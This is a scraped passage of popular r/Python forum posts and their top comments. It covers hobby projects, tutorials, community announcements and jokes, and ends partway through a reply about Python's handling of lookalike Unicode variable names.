Like the Apple stocks app it gets stock information from Yahoo! Finance and provides a summary of stocks in your watch list. Additionally it works with international exchanges, other types of securities like crypocurrencies, and can give you an overview of your positions and the balance of your accounts. If you use the `refresh` argument or configuration option it will live update too.

You can install it from PyPI by running `pip3 install --user stonky`. The source is available at [https://github.com/jkwill87/stonky](https://github.com/jkwill87/stonky).

Feedback and thoughts are welcome. Thanks!"
These two books changed my life in 2018!,abjuw4,2019-01-02 01:18:40,,"How did they change your life? Serious question, I'm curious what you did with python and if you used it for personal projects or professionally.

Also: I assume you liked the books, how are they compared to each other? "
"I created my first app, ""Timeglass"", a simple, unobtrusive menu bar timer for macOS.",gf4boc,2020-05-07 18:50:34,,"I was searching for a simple menu bar timer for my mac. There are a lot of options, but I couldn't find what I wanted.

I  am very easily distracted when I study - even seeing the exact time left until my break can distract me. Instead I wanted an approximate visual representation of how much time is left. Because I couldn't find  what I was searching for, I made a simple app. I am also learning  python, so this was a nice exercise.

The code is messy, but it works (i hope!). Feedback is more than welcome.

[https://github.com/mountwebs/timeglass](https://github.com/mountwebs/timeglass)

Edit: Now with support for dark mode (suggested by u/VirtualCamel).

Edit2: Now with notification and sound alert."
Embedded Python: Build a Game on the BBC micro:bit – Real Python,nf4jh0,2021-05-18 15:47:45,,"The thing missing from this is any mention of the Mu Editor. It's an IDE specifically for MicroPython/CircuitPython boards that automates the flash process so you don't need to teach middle schoolers how to wrestle with downloading the hex file, opening your file explorer, finding the file, copying it to the board etc. Mu makes it painless. I have no affiliation with it, just a teacher who depends on it everyday. Basically anyone who teaches Python with Microbits uses it so the fact the author didn't mention it is a serious omission. https://codewith.mu/"
Going dark on 12th June,1424s7m,2023-06-06 13:21:42,"I wanted to ask you if r/Python is planning to join the protest against Reddit's new policy. Many subreddits decided to support that initiative. I know it is not directly related to Python, but it is relevant to our community

[what's going on? ](https://www.reddit.com/r/Save3rdPartyApps/comments/13yh0jf/dont_let_reddit_kill_3rd_party_apps/)","We've seen this and I've been working on a full post about it for the last couple of days (though the bulk of it was something I was holding off on until after the admin reply which was posted late yesterday)

The quick version of what the post to come:

I want to, however it is not my decisions, it's the communities decision. I cannot go private without your support. Given this post, votes, and comments, and given that I was not the one to prompt it, I think it's probably something the community supports but I want to be sure.

The post will cover a background on what this is, a summary of how the changes can impact the mods and the users, a review of the admin response and the good will (or lack thereof) in it, and a summary of what the blackout could mean for our community.

Edit:
It took forever to write the whole doc. Here is my [post asking if we should participate](https://www.reddit.com/r/Python/comments/1434dxo/should_rpython_participate_in_the_june_12th/)"
I created a GUI that collates various interests of mine in one handy place,gxsb8v,2020-06-06 22:49:15,,Impressive! How did you do it?
"With my limited knowledge in Python, I wrote a simple script to control my motorized microscope from a keyboard. All instructions are open-source. Just wanted to share with this community for possible comments and suggestions for further improvements.",gizm2t,2020-05-13 22:01:59,,"Nice job! 

I also love the lego build animation towards the end :-)"
Lil cheatsheet,arp3z9,2019-02-18 05:10:08,,If you could go ahead and do this for all of Python.
"I made a course on NumPy. It got good reviews, but sales were weak so I'm releasing the entire thing for free.",l1jdcj,2021-01-21 05:45:27,"My course is called Python NumPy For Your Grandma - So easy your grandma could learn it. Here's the course outline.

1. **Introduction**  
  [1.1 Introduction](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-1-1-introduction)  
2. **Basic Array Stuff**  
  [2.1 NumPy Array Motivation](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-1-numpy-array-motivation)  
  [2.2 NumPy Array Basics](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-2-numpy-array-basics)  
  [2.3 Creating NumPy Arrays](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-3-creating-numpy-arrays)  
  [2.4 Indexing 1-D Arrays](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-4-indexing-1d-arrays)  
  [2.5 Indexing Multidimensional Arrays](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-5-indexing-multidimensional-arrays)  
  [2.6 Basic Math On Arrays](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-6-basic-math-on-arrays)  
  [2.7 Challenge: High School Reunion](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-7-challenge-high-school-reunion)  
  [2.8 Challenge: Gold Miner](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-8-challenge-gold-miner)  
  [2.9 Challenge: Chic-fil-A](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-9-challenge-chic-fil-a)  
3. **Intermediate Array Stuff**  
  [3.1 Broadcasting](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-1-broadcasting)  
  [3.2 newaxis](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-2-newaxis)  
  [3.3 `reshape()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-3-reshape)  
  [3.4 Boolean Indexing](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-4-boolean-indexing)  
  [3.5 nan](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-5-nan)  
  [3.6 infinity](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-6-infinity)  
  [3.7 random](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-7-random)  
  [3.8 Challenge: Love Distance](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-8-challenge-love-distance)  
  [3.9 Challenge: Professor Prick](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-9-challenge-professor-prick)  
  [3.10 Challenge: Psycho Parent](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-10-challenge-psycho-parent)  
4. **Common Operations**  
  [4.1 `where()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-1-where)  
  [4.2 Math Functions](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-2-math-functions)  
  [4.3 `all()` and `any()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-3-all-and-any)  
  [4.4 `concatenate()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-4-concatenate)  
  [4.5 Stacking](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-5-stacking)  
  [4.6 Sorting](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-6-sorting)  
  [4.7 `unique()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-7-unique)  
  [4.8 Challenge: Movie Ratings](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-8-challenge-movie-ratings)  
  [4.9 Challenge: Big Fish](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-9-challenge-big-fish)  
  [4.10 Challenge: Taco Truck](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-10-challenge-taco-truck)  
5. **Advanced Array Stuff**  
  [5.1 Advanced Array Indexing](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-1-advanced-array-indexing)  
  [5.2 View vs Copy](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-2-view-vs-copy)  
  [5.3 Challenge: Population Verification](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-3-challenge-population-verification)  
  [5.4 Challenge: Prime Locations](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-4-challenge-prime-locations)  
  [5.5 Challenge: The Game of Doors](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-5-challenge-the-game-of-doors)  
  [5.6 Challenge: Peanut Butter](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-6-challenge-peanut-butter)  
6. **Final Boss**  
  [6.1 `as_strided()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-1-as_strided)  
  [6.2 `einsum()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-2-einsum)  
  [6.3 Challenge: One-Hot-Encoding](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-3-challenge-one-hot-encoding)  
  [6.4 Challenge: Cumulative Rainfall](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-4-challenge-cumulative-rainfall)  
  [6.5 Challenge: Table Tennis](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-5-challenge-table-tennis)  
  [6.6 Challenge: Where's Waldo](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-6-challenge-wheres-waldo)  
  [6.7 Challenge: Outer Product](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-7-challenge-outer-product)  

If you find this useful, please consider liking my videos and subscribing to my [YouTube channel](https://www.youtube.com/channel/UCOcsois3fuvgFRZGdozQHeg).

Also, stay posted for my next course, Python Pandas For Your Grandpa.

**UPDATE** since this post blew up.  

1.  After >1 year of having a YouTube channel, I had 59 subscribers. I posted this 16 hours ago and now I have 325 subscribers and counting. Two people even *purchased* my course. Like, what!?!? Thank you!  
2.  *Please* stay posted for my next course Python Pandas For Your Grandpa. It's nearly finished after months of work, and the production quality is much better.

**UPDATE 2**  
My [course on Pandas](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa/) has been released!  ([View on YouTube](https://www.youtube.com/playlist?list=PL9oKUrtC4VP7ry0um1QOUUfJBXKnkf-dA))",as_strided looks fun. I can see myself abusing that.
"Hello, world! I'm Al Sweigart, author of ""Automate the Boring Stuff with Python"" and several other programming books. AMA!",otbvoj,2021-07-28 23:11:47,"Howdy, y'all. I'm Al Sweigart (rhymes with ""why dirt""), author of ""Automate the Boring Stuff with Python"" and several other programming books. I release all of my books under a Creative Commons license, so you can read them for free on my website at https://inventwithpython.com

My latest books are [The Big Book of Small Python Projects](https://inventwithpython.com/bigbookpython/) and [Beyond the Basic Stuff with Python](https://inventwithpython.com/beyond/). I'm currently working on a book about recursion (the recursion jokes get funnier every time I hear them) which should be available in 2022. The ideas for this book grew into [a 2018 North Bay Python talk I gave](https://www.youtube.com/watch?v=AfBqVVKg4GE).

""Big Book"" contains the source code for 81 games, puzzles, simulations, and animations that were designed to be short and simple to understand. Folks tend to get caught up in repeating yet another ""hello world"" tutorial, but don't quite know how to apply the programming concepts they learned into actual programs. This book is full of source code that they can study to see how real-world programs work. They aren't just code snippets but actual, runnable programs. If you've been told you should ""work on your projects"" but don't know where to start, or if you've been told ""look at the source code of open source projects"" but found them undocumented and inscrutable, check out these programs.

""Beyond the Basic Stuff"" is a sort of follow up to ""Automate the Boring Stuff"" (or any other beginner Python resource). It goes into how professionals write code and best practices they follow. There's information on how to find help on your own, how to format your code and name your variables, an explanation of common programming jargon, the basics of Git, three chapters on object-oriented programming (and more importantly, when and why to use OOP), and more.

You've probably seen [my posts at the start of the month](https://www.reddit.com/r/Python/comments/obq0cg/automate_the_boring_stuff_with_python_online/) when I make my online Python course free. About 15,000 to 30,000 people sign up each month, though according to my stats only about 5% of people actually complete the course (which is typical for online courses, free or paid).

I got started writing programming books in 2009 when my then-girlfriend was a nanny for kid who wanted to learn to program. I started writing a book (which would become Invent Your Own Computer Games with Python) and self-published. People liked it, so I kept writing, and Automate was my first book through a traditional publisher, No Starch Press. I quit my software developer job in 2013 to finish writing Automate, thinking I'd get another software dev job in a year. But I kept having more ideas for other books, tutorials, videos, etc. so I'm still here writing.

Ask me anything! Post your questions and upvote questions you find interesting, and at 2pm central I'll begin replying.

EDIT (4:30pm Central) Wow, I've been typing nonstop for two and a half hours. I'm going to take a quick break and then keep going. Thanks for the questions, everyone!

EDIT 2: Oh yeah, I forgot to mention I'm also creating a 56-video Udemy course for the Beyond the Basic Stuff with Python book as well. [So far I only have the first 15 videos done, but you can watch them on YouTube.](https://www.youtube.com/watch?v=kSrnLbioN6w&list=PL0-84-yl1fUmeV_2bBSguF_S0TVZk8wow)

EDIT (7:00pm) Heh, wow another two hours flew by. I'm going to drive home and then maybe answer a few more. Thanks again, everyone!

EDIT (10:30pm) Calling it a night. I'll probably answer a few more tomorrow, but I have to get back to work. Thanks again, everyone! Oh, and if you can help me out, writing an (honest) Amazon review for my books (especially the latest two) or even just sharing the links to the free online copies would be really help me get them in front of more people.","I want to thank /u/AlSweigart for taking the time to answer so many questions with us today, and for answering questions throughout more of the day than he had originally planned. Thank you to the community for so many fantastic questions and discussions! Additionally, thank you to our sister communities /r/learnpython and the [Python Discord](https://discord.gg/python) who helped us outline and announce this AMA event.

Going forward we're hoping to have more AMAs, ideally at a rate of once per month. This was a great way to kick them off!

Thank you all! 

--KoCreative"
"Spotlightify - a overlay controller for spotify, allowing you to quickly control your music without distraction. Please let me know if you are interested in this application as I am thinking of making it public on my github in the near future (once more features have been developed), thanks!",go6no5,2020-05-22 06:20:40,,"This application was developed using pyqt5 and spotipy

Edit: Thanks to everyone who upvoted and commented I really appreciate it. I am working to get this code up on github as soon as possible and after that would very much welcome contributions. Thanks again!"
I wrote a python script that I'm running on my phone to play a word game called Ruzzle.,ejnnbc,2020-01-04 07:21:34,,"In Ruzzle, the goal of the game is to get as many points as possible in a timed period. Letters have point values, and modifiers like double letter and triple word change point values of certain words. Everything is done automatically at a button press with Tasker, and automation app for android. I use it to take a screenshot, and then I start a python script running in Termux (linux environment/terminal emulator). This python script crops each letter and gets the value with pytesseract, an OCR library. Next, I run a simple DFS through the grid from each letter to grab all the words, stopping if a prefix doesn't exist (ex a word starting with HTH). I also grab colors of the top left corners to get the multipliers, and then I calculate word scores for all words in a dictionary. Finally, I sort the words by score and grab the coordinates for each of the letters, and store these in a file. I then use some adb sendevent shell commands to simulate fingerpresses, and then I win every game! I faced many problems throughout the development of this project, and I learned a ton and used a lot of new modules. Speeding up parts of the code was annoying and it certainly can still be sped up, but I was able to get the runtime from 30s down to around 2-3s. If you have any questions please ask!

&#x200B;

EDIT: I am working on uploading the program to github right now. I'm going to try and implement all the different features I had originally to make it as accessible as possible. For example, the user can manually input the board (so no OCR). Also, I'm trying to include both root and non-root methods for auto drawing, but these require experimentation on the part of the user. At the bare minimum, the user can simply input the 16 letters and get a list of all the top words.

&#x200B;

EDIT 2: I have uploaded a bare minimum ruzzle solver to [github](https://github.com/dchen327/ruzzle_solver), where you can input a board and the script will find all possible words. It requires very little configuration to run, unlike the OCR and autodraw stuff."
"Started learning python today, Screw 'Hello World' , I'll start with 'Hello There'",hl2ho5,2020-07-04 20:24:22,,You've broken the cardinal rule of programming young padawan
xkcd: Python Environment,8fztrr,2018-04-30 22:26:17,,"For future reference, [original link.](https://xkcd.com/1987/)  
Because the real joke is in the title.  
>The Python environmental protection agency wants to seal it in a cement chamber, with pictoral messages to future civilizations warning them about the danger of using sudo to install random Python packages."
"Work laptop doesn't allow minesweeper? I'm gonna build my own minesweeper, with blackjack, and hookers! In fact, forget the hookers!",es8dai,2020-01-22 14:59:00,,"I started this during the slow season of Christmas when most of the office was gone.  It started very simple and then eventually I learned a lot on better packaging, using `tkinter`, and `git`, so it was a great experience!

I'm not a developer by trade but I just love to code.  Here's my very infantile github for your entertainment, it's bound to have a bunch of bad coding practices: https://github.com/r-ook/pymsweeper"
"I created a video about Neural Networks that is specifically aimed at Python developers! If you understand the Code, you understand how to create a Neural Network from Scratch! The video took me 200h to create and is fully animated! Hope it helps you guys :)",l8jvev,2021-01-30 19:34:11,,Has a very 3blue1brown vibe to it!
Wrote a script that downloads r/wallpaper's hottest 100 images and cycles through them as a wallpaper!,hei6kg,2020-06-24 00:49:50,,"I’m looking for a personal project to keep testing my skills, can you list the tools you used to do this?"
"My startup failed, so I open sourced the code. I hope someone finds it useful.",l4kpou,2021-01-25 17:49:52,,Would you mind sharing why your venture failed? IMO the idea is pretty neat.
I made a Sudoku.com solver using Selenium,fgdbxb,2020-03-10 20:51:44,,"\> Kali Linux wallpaper

\> Windows 10

Wait, that's illegal...

Pretty cool though."
NSA just declassified their python training documents,f2jda1,2020-02-12 09:53:42,"[https://nsa.sfo2.digitaloceanspaces.com/comp3321.pdf](https://nsa.sfo2.digitaloceanspaces.com/comp3321.pdf)

&#x200B;

One of the best all-in-one resources I've ever found. It starts from basics and goes all the way up to an advanced level. I would check this out, even if you're not a beginner.",It's uploaded to [archive.org](https://archive.org/details/comp3321/page/n89/mode/2up/search/device)
"at 44, I am struggling on Python for two months now but I keep at it. 2 hours a night, after the kids sleep, I work on it and will eventually be able to use it to get a better job, a better life for them.",zdpoi4,2022-12-06 08:33:18,"you got to accept to be bad at something to be good at it, right? 

Right? OK, I'll confess... I am posting here anonymously to ...IDK... find support, I guess. .. I can't give up.. for my kids, I need to succeed.

I've done this and I am a bit proud. Very small step for you but for me, it is a big step.

**def** blackjackbis(n1:int, n2:int, n3:int) -> int:  
 if sum((n1,n2,n3)) <= 21:  
 return sum((n1,n2,n3))  
 elif sum((n1,n2,n3))-10 <= 21 and 11 in (n1,n2,n3):  
 return sum((n1,n2,n3)) - 10  
 else:  
 return ""Bust""

thanks","Can i recommend something? I would save the tuple you've got there like this: 

```py
sumnums = sum((n1, n2, n3))
```
Then,  you can just refer back to sumnums whenever you mention it instead of writing it out every time.

Keep it up! Lifetime learning ftw!"
Made this tool with python and my son now hates me,ja5y2m,2020-10-13 11:46:43,"I use it to generate endless random basic math questions for him to practice =)

[https://github.com/januschung/math-worksheet-generator](https://github.com/januschung/math-worksheet-generator)",You summon infinite homework familiars as a dark wizard of 3rd-5th grade mathematics automatons.
"After having this idea a while back and seeing yesterday's post with arduino controlled auto ambient lighting, I creating my own version with python!",gmgezg,2020-05-19 11:03:43,,"Geometry dash is the one game that has continually frustrated me to the point of throwing my phone, wanting to kick babies, and curse very VERY loudly in public more than other game. By a fuckass amount"
I wrote a program that doodles things in MS Paint!,ebjgvl,2019-12-17 03:02:56,,So this is how they make the 90s designs for bus seats
"Spent 9hrs finding a bug yesterday, took 15mins to figure it out today",koat5n,2021-01-01 20:50:31,"I spent the whole day finding a bug yesterday, couldn't find it at the end of the day and got a headache due to stress. Woke up today and found the bug 15 mins after.

Worrying about the delay in the project fogged my mind and I couldn't think logically, blind to different possibilities.

Taking a break and having a clear mind is very important. This has happened to me a couple of times so decided to post this here today to remember not to repeat this ever lol.


Edit: Thanks for the award kind stranger. I thought this was more of a personal problem, reading all the comments I'm happy to know I'm not alone. I feel more normal now 🙂.","I have this too, if I'm super stuck I'll go for a walk or do the washing up.

I've fixed some major bugs at work while washing dishes."
When Python Meets Fourier Transform,dhs74f,2019-10-14 23:31:57,,"Looks like a ""furrier"" transformation 😉"
It takes a village to build an open-source project and a single a**hole to demotivate everyone,npkm6o,2021-06-01 11:26:08,"I am a contributor to Open-Source software([Jina](https://github.com/jina-ai/jina) \- an AI search framework) and I am annoyed with how some people make fun of the sheer hard work of open-source developers.

For the last 1 yr, we had made our contributors team meetings public(everyone could listen and participate during the meeting). And this is what happened in our last meeting - **While we were sharing news about upcoming Jina 2.0 release in the zoom meeting, some loud racist music starts playing automatically and someone starts drawing a d\*ck on the screen.**

Warning: This video is not suitable to watch for kids or at work

[Video clip from the meeting - someone zoombombed at 00:25](https://reddit.com/link/npkm6o/video/8a16kolvlk271/player)

It was demotivating to say the least.

Building open-source project is challenging at multiple fronts other than the core technical challenges

* Understand what needs to be built
* Improve that continuously
* Help people understand the project
* Educate people about the domain
* Reach out people who might benefit from your project
* Collaborate with other contributors
* Deal with issues/PRs
* Deal with outdated versions/docs
* **Deal with different opinions**
* Sometimes deal with jerks like the ones who zoombombed us

The list is long! Open-source is hard!

Open-source exists because of some good people out there like you/me who care about the open-source so deeply to invest their time and energy for a little good for everyone else. It exists because of communities like r/python where we can find the support and the motivation. e.g. via this community, I came to know of many use cases of my project, problems and solutions in my project, and even people who supported me build it.

I wanted to vent out my negative experiences and wanted to say a big \*\*Thank you\*\* to you all open-source people, thanks to many(1.6k) contributors who made it possible for us to release \[Jina 2.0\]([https://github.com/jina-ai/jina/](https://github.com/jina-ai/jina/)) 🤗.

I'd want to know your opinion, how do you deal with such unexpected events and how do you keep yourself motivated as an open-source developer?","The same way you keep yourself motivated when someone figures out how to spam a mailing list.  You realize it's not personal, it's just some idiot getting his jollies off disrupting other people's hard work.  Although it doesn't seem that way, it's just as impersonal as someone figuring out how to spam a mailing list with porno links.  They're not attacking your project or even you, they're just idiots."
Made something similar to Apple's Animoji™ using Python,b3oyhl,2019-03-21 18:36:18,,You can check out the code at https://github.com/thevarunsharma/Animoji-Animate
I made a recursive maze solver in Python,f8bn5w,2020-02-24 00:25:24,,"You're saying this is recursive, but I don't see the solve function being called recursively:

    def recursiveSolve(y, x):
        while [y, x] != [exitY, exitX]:
            pos = [y, x]
            wasHere.append([y, x])
            solution.append([y, x])
            visualiseSolver(x, y, (255, 0, 0))
            if maze[y - 1][x] == ""W"" and [y - 1, x] not in wasHere:
                # print(""Up"")
                possibleSteps = [y - 1, x]
            elif maze[y][x + 1] == ""W"" and [y, x + 1] not in wasHere:
                # print(""Right"")
                possibleSteps = [y, x + 1]
            elif maze[y + 1][x] == ""W"" and [y + 1, x] not in wasHere:
                # print(""Down"")
                possibleSteps = [y + 1, x]
            elif maze[y][x - 1] == ""W"" and [y, x - 1] not in wasHere:
                # print(""Left"")
                possibleSteps = [y, x - 1]
            else:
                # print(""Stuck"", pos)
                solution.pop()
                possibleSteps = [solution[-1][0], solution[-1][1]]
                solution.pop()
                visualiseSolver(x, y, (255, 255, 255))
    
            y = possibleSteps[0]
            x = possibleSteps[1]
        solution.append([exitY, exitX])
        visualiseSolver(exitX, exitY, (255, 0, 0))
        print(""Solution:"", solution)

There is only one call to this function in the rest of your code. This is an iterative Depth First Search with backtracking. There is nothing recursive about it."
Every article about python decorators be like...,714kww,2017-09-20 01:29:14,,"I put together [a video on decorators](https://youtu.be/FsAPt_9Bf3U) that some people have found useful. Some people complained about the rabbit-hole of videos that are referenced in that tutorial, but the best route to learn decorators is to first fully understand [first-class functions](https://youtu.be/kr0mpwqttM0), then [closures](https://youtu.be/swU3c34d2NQ), then [decorators](https://youtu.be/FsAPt_9Bf3U)... so each tutorial stacks on top of the previous."
I made a python script to download subtitles for your movies...,g10v5z,2020-04-14 15:08:43,,"Amazing job, if you rename the subtitle in the end step same name as the movie file you won't need to drop it into the window, will get it automatically.

Also, do you can add a feature to offset the subtitle file like some customized amount of seconds after or before it would be fucking amazing."
I'll be damned,exiubj,2020-02-02 12:21:28,,Indian programmer going where no programmer has gone before.
"BrachioGraph, an ultra-cheap Python-powered drawing machine",dvw09b,2019-11-14 02:34:37,,All the code and building instructions: https://www.brachiograph.art.
I made a Finance Database with over 180.000 tickers to make Investment Decisions easier,lcexoa,2021-02-04 20:49:24,"In my spare time I like to go through financial data to understand what kind of companies exist, how sectors and industries evolve and to test theoretical frameworks. However, I found that it required a lot of effort to figure out which companies belong to which industry and I often ran into paywalls that blocked me from accessing the exact data I was looking for. Platforms like Bloomberg offer such services but at ridiculous prices (up to $24.000 a year). This can make investment decisions for the retail investor rather difficult especially if you don't want to follow 'the herd'. **I wanted to change that.**

**Insert the** [**FinanceDatabase**](https://github.com/JerBouma/FinanceDatabase)**.** A database of over 180.000 symbols (80k+ companies, 15k+ ETFs, 30k+ Funds, 3k+ Cryptocurrencies and more) that is fully categorised per country, industry, sector, category and more. It features a 'Searcher' package (***pip install FinanceDatabase***) that has a user-friendly way of collecting the exact data you want (downloaded straight from the repository). For example, the following code returns all (listed) airlines in the United States (check [Examples](https://github.com/JerBouma/FinanceDatabase#Examples) for more info) :

    import FinanceDatabase as fd
    
    airlines_us = fd.select_equities(country='United States', industry='Airlines')

And the following gives insights in ETFs that have anything to do with 'semiconductor':

    import FinanceDatabase as fd
    
    all_etfs = fd.select_etfs()
    semiconductor_etfs = fd.search_products(all_etfs, 'semiconductor')

What I explicitly am *not* trying to do is re-invent the wheel (again) of Fundamental Data gathering as there are tons of packages out there that do that already (i.e. [FundamentalAnalysis](https://github.com/JerBouma/FundamentalAnalysis), [yfinance](https://github.com/ranaroussi/yfinance), [sec-edgar](https://github.com/sec-edgar/sec-edgar)) but instead allow you to capture sector, industries, specific types of ETFs or cryptocurrencies that would have otherwise resulted in a lot of manual work. Then, when you have this sub-selection you can make use of the earlier mentioned packages.

**If you want to know what is available inside the Database, please have a look** [here](https://github.com/JerBouma/FinanceDatabase/tree/master/Database)**.** Alternatively, you can do the following (an example):

    import FinanceDatabase as fd
    
    equities_countries = fd.show_options('equities','countries') # or sector/industry
    etfs_categories = fd.show_options('etfs')
    cryptocurrencies = fd.show_options('cryptocurrencies')

I hope this can help some of you out making (better) investment decisions and all feedback (positive and negative) and contribution is much appreciated.

EDIT: Thanks for the rewards and kind words everyone!","I love just scanning reddit and then, bam, something really neat and useful. Well done!"
I launched my new website with all my free Python and Machine Learning Tutorials (currently 68).,gpqquf,2020-05-24 22:41:06,,"I hope you enjoy browsing through the tutorials :)

To those who are interested, I built the site using Publish (static site generator) by John Sundell."
I made my handwriting a font on Inkscape and used custom made python script to add random movment (in y axis) for each character. Looks fine or too suspicious?,fofxnx,2020-03-25 07:43:11,,the only thing that might be off if you're hoping to pass it as handwritten is the lack of variation between letters. maybe my writing is just a hot mess but i always switch up printing and writing as I go so the letters don't look identical in each word..
I wrote a program on python to show how the number of swearwords differs across each breaking bad episode to see if there was any kind of correlation - turns out there isn't and this was a complete flop,g78ih1,2020-04-24 21:37:32,,"Even the lack of correlation is still valid data though. Your experiment wasn't a flop, it just yielded different data to what you may have expected."
"A fitting curve that ""boings"" into place (and a digression into spring-mass-dampers, vibration and control theory, and integral transforms)",e1ldoz,2019-11-26 03:41:33,,I absolutely adore how insanely overkill this approach to smooth motion is.
My first major Python project! Made with 100% python using pygame. Source code and download in comments.,htkddu,2020-07-19 01:25:02,,Well done
My gravity simulation almost an entire day of work later! Featuring inelastic collisions,bsy603,2019-05-26 03:02:41,, r/gifsthatendtoosoon
Stack overflow traffic to questions about selected python packages,jogwc5,2020-11-05 19:01:17,,"This could be caused by the fact the pandas isn't super easy to do things in so people ask more questions.

could alos be caused by the fact data science is an up and coming feild. Who knows :P"
Boids - organic motion from 3 simple rules,fpvay3,2020-03-27 19:26:26,,"This is one of the rendering of my recent project: Boids.
Source code can be found [here](https://gitlab.com/chrismit3s/boids).
Inspired by [Code Parade's video](https://youtu.be/bqtqltqcQhw).

[Here](https://ehsankia.com/cjs/cs521/)'s u/Ph0X's interactive browser version :)"
A VS Code extension that displays the values of variables while you type,hd6l9t,2020-06-21 21:03:00,,What happens if your program does something destructive? E.g. write to a file? Is that also executed?
A new kind of Progress Bar for Python,kqbo85,2021-01-05 00:08:22,"# A new kind of Progress Bar for Python, with some very cool animations!

I've made a new kind of progress bar for python! With some very cool animations and a smorgasbord of built-in styles!

[https://github.com/rsalmei/alive-progress](https://github.com/rsalmei/alive-progress)

[alive-progress overview](https://i.redd.it/0e66l0xy8c961.gif)

&#x200B;

The spinners and unknown bars have a plethora of effects!

[alive-progress styles](https://i.redd.it/viqlvrka9c961.gif)

&#x200B;

The bars themselves also have several styles.

[alive-progress bars](https://i.redd.it/57y6z5sn9c961.gif)

&#x200B;

It also includes cool zero-hassle print and logging hooks, which are always enabled!

[alive-progress print hook](https://i.redd.it/09ort3su9c961.gif)

&#x200B;

To use it, just ""pip install alive-progress"" and you're good to go!  
More details in [https://github.com/rsalmei/alive-progress](https://github.com/rsalmei/alive-progress)

That's it, hope you like it!","Looks fantastic! How is performance compared to tqdm?

Also how extensible is it?"
Ever heard of Black? This is the opposite. A tool to turn your clean python code into a hideous (working) mess.,rra22x,2021-12-29 22:59:59,"You can find the tool here: [https://github.com/LeviBorodenko/lancer](https://github.com/LeviBorodenko/lancer) (Use with caution!)

# Features

1. Turn all comments into Pitbull lyrics 💃
2. Turn all your variable names into a mixture of animal sounds and horribly similar looking characters like ""bark\_bark\_0OO0O"". 🐶
3. Add irritating white spaces.
4. Code still compiles after all these \_improvements\_! 👷

# Example

Before:

    
    # function that adds two numbers
    def addition(a: int, b: int) -> int:
    
        # find sum
        result = a + b
    
        # return the sum
        return result
    
    
    if __name__ == '__main__':
        print(""Sum of 1 and 3 is %s"" % addition(1, 3))
    

After:

    # there's nothing like Miami's heat
    def quack_Il1Ι1l(squeak_squeak_IIΙΙlI: int, honk_honk_honk_aaαaα: int) -> int:
    
        # Bada bing, bada boom
        growl_growl_growl_ααaaα= squeak_squeak_IIΙΙlI  + honk_honk_honk_aaαaα
    
        # Hey baby, givin' it your all when you're dancin' on me
        return growl_growl_growl_ααaaα
    
    
    if __name__ == '__main__':
        print(""Sum of 1 and 3 is %s"" % quack_Il1Ι1l(1, 3))","> horribly similar looking characters like ""bark_bark_0OO0O"".

A suggestion: abuse the unicode normalization step of the Python parser. See more info here: https://www.asmeurer.com/python-unicode-variable-names/

---

There are some symbols that are wildly different in appearance but which have the same NFKC form; for example 

    ℐℓ𝐈 = 99
    print(ᴵlℑ)  # 99

Both variables normalize to `IlI`.

Those symbols are, in order:

- `\u2110` script capital I
- `\u2113` script small l
- `\U0001d408` mathematical bold capital I

and 

- `\u1d35` modifier letter capital I
- `l` latin small letter l
- `\u2111` black-letter capital I

---


You can also have subtly different variable names which look the same and parse as if they were the same, but are not actually the same text.

    á = 99
    print(á)  # 99
    print(len('á'))  # 2

Those symbols are:

- `a\u0301` - combining acute accent
- `\u00e1` - latin small letter a with acute

---

There are also some symbols that look _identical_ (depending on font), but are not normalized. There are a bunch of these in the Cyrillic and Latin blocks. Cyrillic and Latin have some shared roots but they are separate systems and do not normalize to each other.

If your font doesn't define both Latin and Cyrillic symbols then it can fail, since the fallback font probably looks different. So the Latin characters would appear in one font and the Cyrillic ones in another. Fortunately the common ""modern"" fonts do tend to draw things consistently, although if you're on mobile or use a non-default font then it may not work.

    j, ј = 2, 3
    
    print(j)  # 2
    print(ј)  # 3

Those symbols are:

- `j` latin small letter j
- `\u0458` cyrillic small letter je

---

You can abuse all that to rewrite your addition example as:

    def II(Iӏ, ӏI):
      ӏӏ = Iӏ + ӏI
